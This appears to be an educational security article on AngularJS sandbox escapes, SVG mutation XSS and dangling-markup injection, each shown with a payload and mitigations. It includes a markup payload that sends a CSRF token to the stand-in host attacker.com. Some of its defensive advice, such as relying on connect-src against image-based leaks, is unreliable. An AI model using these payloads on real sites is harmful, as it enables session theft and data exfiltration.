# Advanced XSS Exploitation: Bypassing Modern Web Defenses

## The Persistent Threat of Cross-Site Scripting

Despite decades of security improvements, Cross-Site Scripting (XSS) remains one of the most prevalent web vulnerabilities. Modern web applications employ multiple defense mechanisms like Content Security Policy (CSP) and DOM sanitization, yet sophisticated attackers continue to find bypasses. In this technical exploration, we examine three advanced XSS techniques that circumvent contemporary security controls.

## 1. AngularJS Sandbox Escapes: Breaking the Chains

### Understanding the Sandbox
AngularJS 1.x implemented a sandbox designed to prevent arbitrary JavaScript execution in template expressions (e.g., `{{ userInput }}`). The sandbox worked by:

- Creating a restricted execution environment
- Shadowing native JavaScript functions
- Implementing expression whitelisting

### The Escape Technique
Security researchers discovered prototype pollution could break these restrictions:

```javascript
{{
  x = {'y':''.constructor.prototype};
  x['y'].charAt = [].join;
  $eval('x=alert(1)');
}}
```

**Exploitation Breakdown:**
1. Accesses the String prototype through constructor chaining
2. Overrides the `charAt` function to bypass sandbox checks
3. Uses Angular's `$eval` to execute arbitrary JavaScript

**Impact Assessment:**
- Effective even with partial CSP implementations
- Bypasses input filters unaware of Angular contexts
- Particularly dangerous in legacy applications

**Mitigation Strategies:**
- Upgrade to Angular 2+ (eliminated the sandbox model)
- Implement strict CSP without `unsafe-eval`
- Apply context-aware output encoding

## 2. Mutation XSS: When Parsers Betray You

### The mXSS Vulnerability
Mutation XSS occurs when browser DOM parsing behavior differs from server-side sanitization, allowing malicious markup to transform during rendering.

### Case Study: SVG mXSS
```html
<svg>
  <style><![CDATA[</style>
  <img src=x onerror=alert(1)>
]]>
</svg>
```

**Attack Flow:**
1. Sanitizer processes as harmless SVG with CDATA
2. Browser's reparsing breaks context boundaries
3. `onerror` handler executes during final rendering

**Bypassed Protections:**
- DOMPurify and similar sanitizers
- React's dangerouslySetInnerHTML
- WYSIWYG editors with HTML support

**Defensive Measures:**
- Configure DOMPurify with `RETURN_DOM: false`
- Implement nonce-based CSP
- Maintain current sanitization libraries

## 3. Dangling Markup: The Silent Data Exfiltration

### Technique Overview
When complete XSS is blocked, attackers can still exfiltrate sensitive data through malformed HTML tags.

### Exploitation Scenario
**Vulnerable Element:**
```html
<input type="text" value="USER_CONTROLLED_INPUT">
```

**Malicious Payload:**
```html
"><img src='https://attacker.com?exfil=
```

**Resulting Markup:**
```html
<input type="text" value=""><img src='https://attacker.com?exfil=CSRF_TOKEN'>
```

**Key Characteristics:**
- Operates without JavaScript execution
- Bypasses strict CSP policies
- Effective against applications with partial encoding

**Prevention Methods:**
- Strict HTML attribute encoding
- CSP `connect-src` directives
- Input validation for incomplete tags

## Comparative Defense Analysis

| Technique | Bypassed Protections | Severity | Primary Countermeasures |
|-----------|----------------------|----------|-------------------------|
| AngularJS Escape | CSP (with unsafe-eval) | Critical | Framework migration |
| Mutation XSS | DOMPurify, React | High | Parser-aware sanitization |
| Dangling Markup | All CSP policies | Medium-High | Strict output encoding |

## Security Recommendations

1. **Defense in Depth**
   - Combine CSP with proper encoding and validation
   - Implement multiple layers of protection

2. **Maintenance Practices**
   - Regularly update frameworks and libraries
   - Monitor for new bypass techniques

3. **Content Security Policy**
   - Avoid `unsafe-eval` and `unsafe-inline`
   - Use nonce-based script loading

4. **Security Testing**
   - Include mutation testing in assessments
   - Conduct regular penetration tests

## Final Thoughts

XSS continues to evolve alongside web technologies. These advanced techniques demonstrate that traditional security measures alone are insufficient. By understanding these attack vectors and implementing comprehensive defenses, organizations can significantly reduce their XSS risk surface.
